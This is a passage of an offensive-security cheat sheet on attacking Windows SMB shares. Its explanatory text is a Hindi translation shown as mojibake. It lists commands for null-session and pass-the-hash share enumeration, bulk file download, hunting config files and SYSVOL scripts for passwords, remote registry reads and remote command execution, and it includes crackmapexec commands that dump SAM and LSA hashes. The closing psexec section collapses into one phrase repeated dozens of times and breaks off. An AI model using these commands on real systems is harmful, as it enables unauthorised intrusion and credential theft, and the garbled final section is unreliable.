### рд╕рд╛рдЭрд╛ рдлрд╝реЛрд▓реНрдбрд░реНрд╕ рдХреА рд╕реВрдЪреА

рд╣рдореЗрд╢рд╛ рд╕рд┐рдлрд╝рд╛рд░рд┐рд╢ рдХреА рдЬрд╛рддреА рд╣реИ рдХрд┐ рдЖрдк рджреЗрдЦреЗрдВ рдХрд┐ рдХреНрдпрд╛ рдЖрдк рдХрд┐рд╕реА рдЪреАрдЬрд╝ рддрдХ рдкрд╣реБрдБрдЪ рд╕рдХрддреЗ рд╣реИрдВ, рдпрджрд┐ рдЖрдкрдХреЗ рдкрд╛рд╕ рдХреНрд░реЗрдбреЗрдВрд╢рд┐рдпрд▓ рдирд╣реАрдВ рд╣реИрдВ рддреЛ **null** **рдХреНрд░реЗрдбреЗрдВрд╢рд┐рдпрд▓/рдореЗрд╣рдорд╛рди рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛** рдХрд╛ рдкреНрд░рдпрд╛рд╕ рдХрд░реЗрдВред
```bash
smbclient --no-pass -L //<IP> # Null user
smbclient -U 'username[%passwd]' -L [--pw-nt-hash] //<IP> #If you omit the pwd, it will be prompted. With --pw-nt-hash, the pwd provided is the NT hash

smbmap -H <IP> [-P <PORT>] #Null user
smbmap -u "username" -p "password" -H <IP> [-P <PORT>] #Creds
smbmap -u "username" -p "<NT>:<LM>" -H <IP> [-P <PORT>] #Pass-the-Hash
smbmap -R -u "username" -p "password" -H <IP> [-P <PORT>] #Recursive list

crackmapexec smb <IP> -u '' -p '' --shares #Null user
crackmapexec smb <IP> -u 'username' -p 'password' --shares #Guest user
crackmapexec smb <IP> -u 'username' -H '<HASH>' --shares #Guest user
```
### **рдПрдХ рд╕рд╛рдЭрд╛ рдлрд╝реЛрд▓реНрдбрд░ рдХрдиреЗрдХреНрдЯ/рд╕реВрдЪреАрдмрджреНрдз рдХрд░реЗрдВ**
```bash
#Connect using smbclient
smbclient --no-pass //<IP>/<Folder>
smbclient -U 'username[%passwd]' -L [--pw-nt-hash] //<IP> #If you omit the pwd, it will be prompted. With --pw-nt-hash, the pwd provided is the NT hash
#Use --no-pass -c 'recurse;ls'  to list recursively with smbclient

#List with smbmap, without folder it list everything
smbmap [-u "username" -p "password"] -R [Folder] -H <IP> [-P <PORT>] # Recursive list
smbmap [-u "username" -p "password"] -r [Folder] -H <IP> [-P <PORT>] # Non-Recursive list
smbmap -u "username" -p "<NT>:<LM>" [-r/-R] [Folder] -H <IP> [-P <PORT>] #Pass-the-Hash
```
### **Windows рд╢реЗрдпрд░реЛрдВ рдХреЛ рдореИрдиреНрдпреБрдЕрд▓ рд░реВрдк рд╕реЗ рдЬрд╛рдВрдЪреЗрдВ рдФрд░ рдЙрдирд╕реЗ рдХрдиреЗрдХреНрдЯ рдХрд░реЗрдВ**

рд╕рдВрднрд╛рд╡рдирд╛ рд╣реИ рдХрд┐ рдЖрдкрдХреЛ рдорд╛рдиреНрдпрддрд╛ рдирд╣реАрдВ рд╣реИ рдХрд┐ рдореЗрдЬрд╝рдмрд╛рди рдорд╢реАрди рдХреЗ рдХрд┐рд╕реА рднреА рд╢реЗрдпрд░ рдХреЛ рдкреНрд░рджрд░реНрд╢рд┐рдд рдХрд░реЗрдВ рдФрд░ рдЬрдм рдЖрдк рдЙрдиреНрд╣реЗрдВ рд╕реВрдЪреАрдд рдХрд░рдиреЗ рдХрд╛ рдкреНрд░рдпрд╛рд╕ рдХрд░рддреЗ рд╣реИрдВ рддреЛ рдРрд╕рд╛ рд▓рдЧрддрд╛ рд╣реИ рдХрд┐ рдХрдиреЗрдХреНрдЯ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдХреЛрдИ рд╢реЗрдпрд░ рдирд╣реАрдВ рд╣реИред рдЗрд╕рд▓рд┐рдП рдпрд╣ рдорд╣рддреНрд╡рдкреВрд░реНрдг рд╣реЛ рд╕рдХрддрд╛ рд╣реИ рдХрд┐ рдПрдХ рд╢реЗрдпрд░ рдХреЗ рд▓рд┐рдП рдореИрдиреНрдпреБрдЕрд▓ рдХрдиреЗрдХреНрдЯ рдХрд░рдиреЗ рдХрд╛ рдкреНрд░рдпрд╛рд╕ рдХрд┐рдпрд╛ рдЬрд╛рдПред рд╢реЗрдпрд░реЛрдВ рдХреЛ рдореИрдиреНрдпреБрдЕрд▓ рд░реВрдк рд╕реЗ рдЬрд╛рдВрдЪрдиреЗ рдХреЗ рд▓рд┐рдП рдЖрдкрдХреЛ NT\_STATUS\_ACCESS\_DENIED рдФрд░ NT\_STATUS\_BAD\_NETWORK\_NAME рдЬреИрд╕реЗ рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛рдПрдБ рджреЗрдЦрдирд╛ рдЪрд╛рд╣рд┐рдП, рдЬрдм рдПрдХ рд╡реИрдз рд╕рддреНрд░ (рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП рдирд▓ рд╕рддреНрд░ рдпрд╛ рд╡реИрдз рдХреНрд░реЗрдбреЗрдВрд╢рд┐рдпрд▓реНрд╕) рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд░рд╣реЗ рд╣реЛрдВред рдпреЗ рдЗрд╕рдХрд╛ рд╕рдВрдХреЗрдд рджреЗ рд╕рдХрддреЗ рд╣реИрдВ рдХрд┐ рдХреНрдпрд╛ рд╢реЗрдпрд░ рдореМрдЬреВрдж рд╣реИ рдФрд░ рдЖрдкрдХреЛ рдЙрд╕рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рдирд╣реАрдВ рд╣реИ рдпрд╛ рд╢реЗрдпрд░ рдкреВрд░реА рддрд░рд╣ рд╕реЗ рдореМрдЬреВрдж рдирд╣реАрдВ рд╣реИред

Windows рд▓рдХреНрд╖реНрдпреЛрдВ рдХреЗ рд▓рд┐рдП рд╕рд╛рдорд╛рдиреНрдп рд╢реЗрдпрд░ рдирд╛рдо рд╣реИрдВ

* C$
* D$
* ADMIN$
* IPC$
* PRINT$
* FAX$
* SYSVOL
* NETLOGON

(_**рдиреЗрдЯрд╡рд░реНрдХ рд╕реБрд░рдХреНрд╖рд╛ рдореВрд▓реНрдпрд╛рдВрдХрди 3 рд╡реАрдВ рд╕рдВрд╕реНрдХрд░рдг**_ рд╕реЗ рд╕рд╛рдорд╛рдиреНрдп рд╢реЗрдпрд░ рдирд╛рдо)

рдЖрдк рдЗрдирдореЗрдВ рд╕реЗ рдХрд┐рд╕реА рдХреЛ рдХрдиреЗрдХреНрдЯ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдХрдорд╛рдВрдб рдХрд╛ рдкреНрд░рдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ
```bash
smbclient -U '%' -N \\\\<IP>\\<SHARE> # null session to connect to a windows share
smbclient -U '<USER>' \\\\<IP>\\<SHARE> # authenticated session to connect to a windows share (you will be prompted for a password)
```
рдЗрд╕ рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдХреЗ рд▓рд┐рдП (рдирд▓ рд╕реЗрд╢рди рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ)
```bash
#/bin/bash

ip='<TARGET-IP-HERE>'
shares=('C$' 'D$' 'ADMIN$' 'IPC$' 'PRINT$' 'FAX$' 'SYSVOL' 'NETLOGON')

for share in ${shares[*]}; do
output=$(smbclient -U '%' -N \\\\$ip\\$share -c '')

if [[ -z $output ]]; then
echo "[+] creating a null session is possible for $share" # no output if command goes through, thus assuming that a session was created
else
echo $output # echo error message (e.g. NT_STATUS_ACCESS_DENIED or NT_STATUS_BAD_NETWORK_NAME)
fi
done
```
рдЙрджрд╛рд╣рд░рдг
```bash
smbclient -U '%' -N \\\\192.168.0.24\\im_clearly_not_here # returns NT_STATUS_BAD_NETWORK_NAME
smbclient -U '%' -N \\\\192.168.0.24\\ADMIN$ # returns NT_STATUS_ACCESS_DENIED or even gives you a session
```
### **Windows рд╕реЗ рд╢реЗрдпрд░реЛрдВ рдХреА рдЬрд╛рдВрдЪ рдХрд░реЗрдВ / рддреАрд╕рд░реЗ рдкрдХреНрд╖ рдХреЗ рдЙрдкрдХрд░рдг рдХреЗ рдмрд┐рдирд╛**

PowerShell
```powershell
# Retrieves the SMB shares on the locale computer.
Get-SmbShare
Get-WmiObject -Class Win32_Share
# Retrieves the SMB shares on a remote computer.
get-smbshare -CimSession "<computer name or session object>"
# Retrieves the connections established from the local SMB client to the SMB servers.
Get-SmbConnection
```
CMD рдХрдВрд╕реЛрд▓
```shell
# List shares on the local computer
net share
# List shares on a remote computer (including hidden ones)
net view \\<ip> /all
```
### MMC рд╕реНрдиреИрдк-рдЗрди (рдЧреНрд░рд╛рдлрд┐рдХрд▓)
```shell
# Shared Folders: Shared Folders > Shares
fsmgmt.msc
# Computer Management: Computer Management > System Tools > Shared Folders > Shares
compmgmt.msc
```
### рд╕рд╛рдЭрд╛ рдлрд╝реЛрд▓реНрдбрд░ рдорд╛рдЙрдВрдЯ рдХрд░реЗрдВ

explorer.exe (рдЧреНрд░рд╛рдлрд┐рдХрд▓), `\\<ip>\` рджрд░реНрдЬ рдХрд░реЗрдВ рддрд╛рдХрд┐ рдЙрдкрд▓рдмреНрдз рдЧреИрд░-рдЫрд┐рдкреА рд╢реЗрдпрд░ рджреЗрдЦ рд╕рдХреЗрдВред
```bash
mount -t cifs //x.x.x.x/share /mnt/share
mount -t cifs -o "username=user,password=password" //x.x.x.x/share /mnt/share
```
### **рдлрд╝рд╛рдЗрд▓реЗрдВ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░реЗрдВ**

рдкрд╛рд╕рд╡рд░реНрдб/рдкрд╛рд╕-рдж-рд╣реИрд╢ рдХреЗ рд╕рд╛рде рдХрдиреЗрдХреНрдЯ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдкрд┐рдЫрд▓реЗ рдЦрдВрдб рдкрдврд╝реЗрдВред
```bash
#Search a file and download
sudo smbmap -R Folder -H <IP> -A <FileName> -q # Search the file in recursive mode and download it inside /usr/share/smbmap
```

```bash
#Download all
smbclient //<IP>/<share>
> mask ""
> recurse
> prompt
> mget *
#Download everything to current directory
```
### рдбреЛрдореЗрди рд╕рд╛рдЭрд╛ рдлрд╝реЛрд▓реНрдбрд░ рдЦреЛрдЬ

* [**Snaffler**](https://github.com/SnaffCon/Snaffler)\*\*\*\*
```bash
Snaffler.exe -s -d domain.local -o snaffler.log -v data
```
* [**CrackMapExec**](https://wiki.porchetta.industries/smb-protocol/spidering-shares) рд╕реНрдкрд╛рдЗрдбрд░ред
* `-M spider_plus [--share <share_name>]`
* `--рдкреИрдЯрд░реНрди txt`
```bash
sudo crackmapexec smb 10.10.10.10 -u username -p pass -M spider_plus --share 'Department Shares'
```
рд╡рд┐рд╢реЗрд╖ рд░реВрдк рд╕реЗ рд╢реЗрдпрд░ рд╕реЗ рдЙрди рдлрд╝рд╛рдЗрд▓реЛрдВ рдореЗрдВ рд░реБрдЪрд┐ рд╣реИ рдЬрд┐рдиреНрд╣реЗрдВ **`Registry.xml`** рдХрд╣рд╛ рдЬрд╛рддрд╛ рд╣реИ рдХреНрдпреЛрдВрдХрд┐ рд╡реЗ **рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛рдУрдВ рдХреЗ рдкрд╛рд╕рд╡рд░реНрдб** рд╢рд╛рдорд┐рд▓ рд╣реЛ рд╕рдХрддреЗ рд╣реИрдВ рдЬреЛ **рд╕рдореВрд╣ рдиреАрддрд┐ рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдСрдЯреЛрд▓реЙрдЧрдСрди** рдХреЗ рд╕рд╛рде рдХреЙрдиреНрдлрд╝рд┐рдЧрд░ рдХрд┐рдП рдЧрдП рд╣реИрдВред рдпрд╛ **`web.config`** рдлрд╝рд╛рдЗрд▓реЗрдВ рдХреНрдпреЛрдВрдХрд┐ рд╡реЗ рдХреНрд░реЗрдбреЗрдВрд╢рд┐рдпрд▓реНрд╕ рд╢рд╛рдорд┐рд▓ рдХрд░рддреА рд╣реИрдВред

{% hint style="info" %}
**SYSVOL рд╢реЗрдпрд░** рдбреЛрдореЗрди рдореЗрдВ рд╕рднреА рдкреНрд░рдорд╛рдгрд┐рдд рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛рдУрдВ рджреНрд╡рд╛рд░рд╛ **рдкрдардиреАрдп** рд╣реИред рд╡рд╣рд╛рдВ рдЖрдкрдХреЛ **рдХрдИ** рд╡рд┐рднрд┐рдиреНрди рдмреИрдЪ, рд╡реАрдмреАрд╕реНрдХреНрд░рд┐рдкреНрдЯ, рдФрд░ рдкрд╛рд╡рд░рд╢реЗрд▓ **рд╕реНрдХреНрд░рд┐рдкреНрдЯ** рдорд┐рд▓ рд╕рдХрддреЗ рд╣реИрдВред\
рдЖрдкрдХреЛ рдЗрд╕рдХреЗ рдЕрдВрджрд░ рдХреЗ **рд╕реНрдХреНрд░рд┐рдкреНрдЯ** рдХреА **рдЬрд╛рдБрдЪ** рдХрд░рдиреА рдЪрд╛рд╣рд┐рдП рдХреНрдпреЛрдВрдХрд┐ рдЖрдкрдХреЛ **рдкрд╛рд╕рд╡рд░реНрдб** рдЬреИрд╕реА рд╕рдВрд╡реЗрджрдирд╢реАрд▓ рдЬрд╛рдирдХрд╛рд░реА рдорд┐рд▓ рд╕рдХрддреА рд╣реИред
{% endhint %}

## рд░рдЬрд┐рд╕реНрдЯреНрд░реА рдкрдврд╝реЗрдВ

рдЖрдк рдХреБрдЫ рдкрд╛рдП рдЧрдП рдХреНрд░реЗрдбреЗрдВрд╢рд┐рдпрд▓ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рд░рдЬрд┐рд╕реНрдЯреНрд░реА рдХреЛ **рдкрдврд╝ рд╕рдХрддреЗ** рд╣реИрдВред Impacket **`reg.py`** рдЖрдкрдХреЛ рдпрд╣ рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИ:
```bash
sudo reg.py domain.local/USERNAME@MACHINE.htb -hashes 1a3487d42adaa12332bdb34a876cb7e6:1a3487d42adaa12332bdb34a876cb7e6 query -keyName HKU -s
sudo reg.py domain.local/USERNAME@MACHINE.htb -hashes 1a3487d42adaa12332bdb34a876cb7e6:1a3487d42adaa12332bdb34a876cb7e6 query -keyName HKCU -s
sudo reg.py domain.local/USERNAME@MACHINE.htb -hashes 1a3487d42adaa12332bdb34a876cb7e6:1a3487d42adaa12332bdb34a876cb7e6 query -keyName HKLM -s
```
## рдкреЛрд╕реНрдЯ рдПрдХреНрд╕рдкреНрд▓реЛрдЗрдЯреЗрд╢рди

**рдПрдХ рд╕рд╛рдорд╛рдиреНрдп рд╕рдВрдЧрдарди** рдХрд╛ **рд╕реНрдерд╛рди** рдЖрдо рддреМрд░ рдкрд░ `/etc/samba/smb.conf` рдореЗрдВ рд╣реЛрддрд╛ рд╣реИ рдФрд░ рдХреБрдЫ **рдЦрддрд░рдирд╛рдХ рд╕реЗрдЯрд┐рдВрдЧреНрд╕** рд╣реЛ рд╕рдХрддреА рд╣реИрдВ:

| **рд╕реЗрдЯрд┐рдВрдЧ**                 | **рд╡рд┐рд╡рд░рдг**                                                     |
| --------------------------- | ------------------------------------------------------------------- |
| `browseable = yes`          | рдХреНрдпрд╛ рдореМрдЬреВрджрд╛ рд╢реЗрдпрд░реНрд╕ рдХреА рд╕реВрдЪреА рджреЗрдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рд╣реИ?                |
| `read only = no`            | рдХреНрдпрд╛ рдлрд╝рд╛рдЗрд▓реЛрдВ рдХреА рд░рдЪрдирд╛ рдФрд░ рд╕рдВрд╢реЛрдзрди рдХреЛ рдирд┐рд╖реЗрдзрд┐рдд рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ?                      |
| `writable = yes`            | рдХреНрдпрд╛ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛рдУрдВ рдХреЛ рдлрд╝рд╛рдЗрд▓реЗрдВ рдмрдирд╛рдиреЗ рдФрд░ рд╕рдВрд╢реЛрдзрд┐рдд рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рд╣реИ?                             |
| `guest ok = yes`            | рдХреНрдпрд╛ рдмрд┐рдирд╛ рдкрд╛рд╕рд╡рд░реНрдб рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд┐рдП рд╕реЗрд╡рд╛ рд╕реЗ рдХрдиреЗрдХреНрдЯ рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рд╣реИ?           |
| `enable privileges = yes`   | рдХреНрдпрд╛ рд╡рд┐рд╢рд┐рд╖реНрдЯ SID рдХреЛ рд╕реМрдВрдкреА рдЧрдИ рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░реЛрдВ рдХрд╛ рд╕рдореНрдорд╛рди рдХрд┐рдпрд╛ рдЬрд╛рдирд╛ рдЪрд╛рд╣рд┐рдП?                          |
| `create mask = 0777`        | рдирд╡рдирд┐рд░реНрдорд┐рдд рдлрд╝рд╛рдЗрд▓реЛрдВ рдХреЛ рдХрд┐рд╕ рдЕрдиреБрдорддрд┐ рдХреЛ рд╕реМрдВрдкрд╛ рдЬрд╛рдирд╛ рдЪрд╛рд╣рд┐рдП?       |
| `directory mask = 0777`     | рдирд╡рдирд┐рд░реНрдорд┐рдд рдирд┐рд░реНрджреЗрд╢рд┐рдХрд╛рдУрдВ рдХреЛ рдХрд┐рд╕ рдЕрдиреБрдорддрд┐ рдХреЛ рд╕реМрдВрдкрд╛ рдЬрд╛рдирд╛ рдЪрд╛рд╣рд┐рдП? |
| `logon script = script.sh`  | рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЗ рд▓реЙрдЧрд┐рди рдкрд░ рдХреМрди рд╕рд╛ рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░рдиреЗ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реИ?               |
| `magic script = script.sh`  | рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдмрдВрдж рд╣реЛрдиреЗ рдкрд░ рдХреМрди рд╕реА рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХреА рдЬрд╛рдиреА рдЪрд╛рд╣рд┐рдП?        |
| `magic output = script.out` | рдЬрд╣рд╛рдВ рдЬрд╛рджреВ рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдХрд╛ рдЖрдЙрдЯрдкреБрдЯ рд╕реНрдЯреЛрд░ рдХрд┐рдпрд╛ рдЬрд╛рдирд╛ рдЪрд╛рд╣рд┐рдП?            |

`Smbstatus` рдХрдорд╛рдВрдб **рд╕рд░реНрд╡рд░** рдФрд░ **рдХреМрди рдХрдиреЗрдХреНрдЯ рд╣реИ** рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рдЬрд╛рдирдХрд╛рд░реА рджреЗрддрд╛ рд╣реИред

## рдХреЗрд░рдмреЗрд░реЛрд╕ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдкреНрд░рдорд╛рдгреАрдХрд░рдг рдХрд░реЗрдВ

рдЖрдк **smbclient** рдФрд░ **rpcclient** рдЙрдкрдХрд░рдгреЛрдВ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ **рдХреЗрд░рдмреЗрд░реЛрд╕** рдореЗрдВ **рдкреНрд░рдорд╛рдгреАрдХрд░рдг** рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:
```bash
smbclient --kerberos //ws01win10.domain.com/C$
rpcclient -k ws01win10.domain.com
```
## **рдХрдорд╛рдВрдб рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░реЗрдВ**

### **crackmapexec**

crackmapexec рдХрд┐рд╕реА рднреА **mmcexec, smbexec, atexec, wmiexec** рдореЗрдВ рд╕реЗ рдХрд┐рд╕реА рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ рдХрд░рдХреЗ рдХрдорд╛рдВрдб рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░ рд╕рдХрддрд╛ рд╣реИ, рдЬрд┐рд╕рдореЗрдВ **wmiexec** рдбрд┐рдлрд╝реЙрд▓реНрдЯ рд╡рд┐рдзрд┐ рд╣реИред рдЖрдк `--exec-method` рдкреИрд░рд╛рдореАрдЯрд░ рдХреЗ рд╕рд╛рде рдЗрд╕рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдиреЗ рдХреА рдкрд╕рдВрдж рдХрд┐рд╕реЗ рджрд░реНрд╢рд╛ рд╕рдХрддреЗ рд╣реИрдВ:
```bash
apt-get install crackmapexec

crackmapexec smb 192.168.10.11 -u Administrator -p 'P@ssw0rd' -X '$PSVersionTable' #Execute Powershell
crackmapexec smb 192.168.10.11 -u Administrator -p 'P@ssw0rd' -x whoami #Excute cmd
crackmapexec smb 192.168.10.11 -u Administrator -H <NTHASH> -x whoami #Pass-the-Hash
# Using --exec-method {mmcexec,smbexec,atexec,wmiexec}

crackmapexec smb <IP> -d <DOMAIN> -u Administrator -p 'password' --sam #Dump SAM
crackmapexec smb <IP> -d <DOMAIN> -u Administrator -p 'password' --lsa #Dump LSASS in memmory hashes
crackmapexec smb <IP> -d <DOMAIN> -u Administrator -p 'password' --sessions #Get sessions (
crackmapexec smb <IP> -d <DOMAIN> -u Administrator -p 'password' --loggedon-users #Get logged-on users
crackmapexec smb <IP> -d <DOMAIN> -u Administrator -p 'password' --disks #Enumerate the disks
crackmapexec smb <IP> -d <DOMAIN> -u Administrator -p 'password' --users #Enumerate users
crackmapexec smb <IP> -d <DOMAIN> -u Administrator -p 'password' --groups # Enumerate groups
crackmapexec smb <IP> -d <DOMAIN> -u Administrator -p 'password' --local-groups # Enumerate local groups
crackmapexec smb <IP> -d <DOMAIN> -u Administrator -p 'password' --pass-pol #Get password policy
crackmapexec smb <IP> -d <DOMAIN> -u Administrator -p 'password' --rid-brute #RID brute

crackmapexec smb <IP> -d <DOMAIN> -u Administrator -H <HASH> #Pass-The-Hash
```
### [**psexec**](../windows-hardening/ntlm/psexec-and-winexec.md)**/**[**smbexec**](../windows-hardening/ntlm/smbexec.md)

рджреЛрдиреЛрдВ рд╡рд┐рдХрд▓реНрдк **рдПрдХ рдирдИ рд╕реЗрд╡рд╛ рдмрдирд╛рдПрдВрдЧреЗ** (SMB рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ _\pipe\svcctl_ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ) рд╢рд┐рдХрд╛рд░ рдорд╢реАрди рдореЗрдВ рдФрд░ рдЗрд╕рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░реЗрдВрдЧреЗ **рдХреБрдЫ рдХреЛ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП** (**psexec** рдПрдХ рдПрдХреНрдЬреАрдХреНрдпреВрдЯреЗрдмрд▓ рдлрд╝рд╛рдЗрд▓ рдХреЛ ADMIN$ рд╢реЗрдпрд░ рдкрд░ **рдЕрдкрд▓реЛрдб** рдХрд░реЗрдЧрд╛ рдФрд░ **smbexec** **cmd.exe/powershell.exe** рдХреА рдУрд░ рдЗрд╢рд╛рд░рд╛ рдХрд░реЗрдЧрд╛ рдФрд░ рддрд╛рдХрддрд╡рд░ --**рдлрд╝рд╛рдЗрд▓-рд▓реЗрд╕ рддрдХрдиреАрдХ--**-- рдХреЛ рддрд╛рдХрддрд╡рд░ --**рдлрд╝рд╛рдЗрд▓-рд▓реЗрд╕ рддрдХрдиреАрдХ--**-- рдХреЛ рддрд╛рдХрддрд╡рд░ --**рдлрд╝рд╛рдЗрд▓-рд▓реЗрд╕ рддрдХрдиреАрдХ--**-- рдХреЛ рддрд╛рдХрддрд╡рд░ --**рдлрд╝рд╛рдЗрд▓-рд▓реЗрд╕ рддрдХрдиреАрдХ--**-- рдХреЛ рддрд╛рдХрддрд╡рд░ --**рдлрд╝рд╛рдЗрд▓-рд▓реЗрд╕ рддрдХрдиреАрдХ--**-- рдХреЛ рддрд╛рдХрддрд╡рд░ --**рдлрд╝рд╛рдЗрд▓-рд▓реЗрд╕ рддрдХрдиреАрдХ--**-- рдХреЛ рддрд╛рдХрддрд╡рд░ --**рдлрд╝рд╛рдЗрд▓-рд▓реЗрд╕ рддрдХрдиреАрдХ--**-- рдХреЛ рддрд╛рдХрддрд╡рд░ --**рдлрд╝рд╛рдЗрд▓-рд▓реЗрд╕ рддрдХрдиреАрдХ--**-- рдХреЛ рддрд╛рдХрддрд╡рд░ --**рдлрд╝рд╛рдЗрд▓-рд▓реЗрд╕ рддрдХрдиреАрдХ--**-- рдХреЛ рддрд╛рдХрддрд╡рд░ --**рдлрд╝рд╛рдЗрд▓-рд▓реЗрд╕ рддрдХрдиреАрдХ--**-- рдХреЛ рддрд╛рдХрддрд╡рд░ --**рдлрд╝рд╛рдЗрд▓-рд▓реЗрд╕ рддрдХрдиреАрдХ--**-- рдХреЛ рддрд╛рдХрддрд╡рд░ --**рдлрд╝рд╛рдЗрд▓-рд▓реЗрд╕ рддрдХрдиреАрдХ--**-- рдХреЛ рддрд╛рдХрддрд╡рд░ --**рдлрд╝рд╛рдЗрд▓-рд▓реЗрд╕ рддрдХрдиреАрдХ--**-- рдХреЛ рддрд╛рдХрддрд╡рд░ --**рдлрд╝рд╛рдЗрд▓-рд▓реЗрд╕ рддрдХрдиреАрдХ--**-- рдХреЛ рддрд╛рдХрддрд╡рд░ --**рдлрд╝рд╛рдЗрд▓-рд▓реЗрд╕ рддрдХрдиреАрдХ--**-- рдХреЛ рддрд╛рдХрддрд╡рд░ --**рдлрд╝рд╛рдЗрд▓-рд▓реЗрд╕ рддрдХрдиреАрдХ--**-- рдХреЛ рддрд╛рдХрддрд╡рд░ --**рдлрд╝рд╛рдЗрд▓-рд▓реЗрд╕ рддрдХрдиреАрдХ--**-- рдХреЛ рддрд╛рдХрддрд╡рд░ --**рдлрд╝рд╛рдЗрд▓-рд▓реЗрд╕ рддрдХрдиреАрдХ--**-- рдХреЛ рддрд╛рдХрддрд╡рд░ --**рдлрд╝рд╛рдЗрд▓-рд▓реЗрд╕ рддрдХрдиреАрдХ--**-- рдХреЛ рддрд╛рдХрддрд╡рд░ --**рдлрд╝рд╛рдЗрд▓-рд▓реЗрд╕ рддрдХрдиреАрдХ--**-- рдХреЛ рддрд╛рдХрддрд╡рд░ --**рдлрд╝рд╛рдЗрд▓-рд▓реЗрд╕ рддрдХрдиреАрдХ--**-- рдХреЛ рддрд╛рдХрддрд╡рд░ --**рдлрд╝рд╛рдЗрд▓-рд▓реЗрд╕ рддрдХрдиреАрдХ--**-- рдХреЛ рддрд╛рдХрддрд╡рд░ --**рдлрд╝рд╛рдЗрд▓-рд▓реЗрд╕ рддрдХрдиреАрдХ--**-- рдХреЛ рддрд╛рдХрддрд╡рд░ --**рдлрд╝рд╛рдЗрд▓-рд▓реЗрд╕ рддрдХрдиреАрдХ--**-- рдХреЛ рддрд╛рдХрддрд╡рд░ --**рдлрд╝рд╛рдЗрд▓-рд▓реЗрд╕ рддрдХрдиреАрдХ--**-- рдХреЛ рддрд╛рдХрддрд╡рд░ --**рдлрд╝рд╛рдЗрд▓-рд▓реЗрд╕ рддрдХрдиреАрдХ--**-- рдХреЛ рддрд╛рдХрддрд╡рд░ --**рдлрд╝рд╛рдЗрд▓-рд▓реЗрд╕ рддрдХрдиреАрдХ--**-- рдХреЛ рддрд╛рдХрддрд╡рд░ --**рдлрд╝рд╛рдЗрд▓-рд▓реЗрд╕ рддрдХрдиреАрдХ--**-- рдХреЛ рддрд╛рдХрддрд╡рд░ --**рдлрд╝рд╛рдЗрд▓-рд▓реЗрд╕ рддрдХрдиреАрдХ--**-- рдХреЛ рддрд╛рдХрддрд╡рд░ --**рдлрд╝рд╛рдЗрд▓-рд▓реЗрд╕ рддрдХрдиреАрдХ--**-- рдХреЛ рддрд╛рдХрддрд╡рд░ --**рдлрд╝рд╛рдЗрд▓-рд▓реЗрд╕ рддрдХрдиреАрдХ--**-- рдХреЛ рддрд╛рдХрддрд╡рд░ --**рдлрд╝рд╛рдЗрд▓-рд▓реЗрд╕ рддрдХрдиреАрдХ--**-- рдХреЛ рддрд╛рдХрддрд╡рд░ --**рдлрд╝рд╛рдЗрд▓-рд▓реЗрд╕ рддрдХрдиреАрдХ--**-- рдХреЛ рддрд╛рдХрддрд╡рд░ --**рдлрд╝рд╛рдЗрд▓-рд▓реЗрд╕ рддрдХрдиреАрдХ--**-- рдХреЛ рддрд╛рдХрддрд╡рд░ --**рдлрд╝рд╛рдЗрд▓-рд▓реЗрд╕ рддрдХрдиреАрдХ--**-- рдХреЛ рддрд╛рдХрддрд╡рд░ --**рдлрд╝рд╛рдЗрд▓-рд▓реЗрд╕ рддрдХрдиреАрдХ--**-- рдХреЛ рддрд╛рдХрддрд╡рд░ --**рдлрд╝рд╛рдЗрд▓-рд▓реЗрд╕ рддрдХрдиреАрдХ--**-- рдХреЛ рддрд╛рдХрддрд╡рд░ --**рдлрд╝рд╛рдЗрд▓-рд▓реЗрд╕ рддрдХрдиреАрдХ--**-- рдХреЛ рддрд╛рдХрддрд╡рд░ --**рдлрд╝рд╛рдЗрд▓-рд▓реЗрд╕ рддрдХрдиреАрдХ--**-- рдХреЛ рддрд╛рдХрддрд╡рд░ 